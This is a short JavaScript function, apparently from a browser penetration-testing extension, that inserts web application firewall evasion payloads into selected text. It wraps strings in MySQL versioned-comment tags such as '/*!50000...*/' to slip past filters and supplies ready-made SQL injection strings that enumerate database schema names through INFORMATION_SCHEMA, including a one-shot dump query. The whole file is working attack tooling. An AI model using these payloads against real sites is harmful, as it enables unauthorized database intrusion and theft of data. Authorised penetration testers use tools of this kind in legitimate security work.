/**
 * WAF Evasion Payload Generator
 * -----------------------------
 * This function applies WAF evasion patterns to selected text.
 * It wraps or transforms the selected string into a payload that may bypass basic WAF filters.
 *
 * Supported operations:
 * - Wrapping strings in MySQL comment-style payloads with version tags
 * - Inserting predefined SQL injection snippets for schema/table/column enumeration
 */

function setWaf(id) {
	// Mapping of operation IDs to transformation templates
	const wafTemplates = {
		waf1: (str) => `/*!${str}------*/`,
		waf2: (str) => `/*!50000${str}------*/`,
		waf3: (str) => `/*!12345${str}------*/`,
		waf4: (str) => `/*!13337${str}------*/`,
		waf5: (str) => `/*!13337${str}------*/`, // Duplicate of waf4; consider removing if redundant
	};

	// Mapping of static SQL payloads (no input required)
	const staticPayloads = {
		wafset1:
			"(SELECT+CONCAT(COUNT(schema_name),0x202f20446174616261736573)+FROM+INFORMATION_SCHEMA.SCHEMATA)",
		wafset2:
			"(SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name,0x3c62723e))))x)",
	};

	// Check if the ID matches a dynamic template
	if (wafTemplates[id]) {
		getSelectedText((str) => {
			if (typeof str !== "string") {
				console.warn("No valid text was selected for WAF transformation.");
				return;
			}
			setSelectedText(wafTemplates[id](str));
		});
		// Check if the ID matches a static payload
	} else if (staticPayloads[id]) {
		setSelectedText(staticPayloads[id]);
	} else {
		console.warn(`Unsupported WAF operation ID: "${id}"`);
	}
}
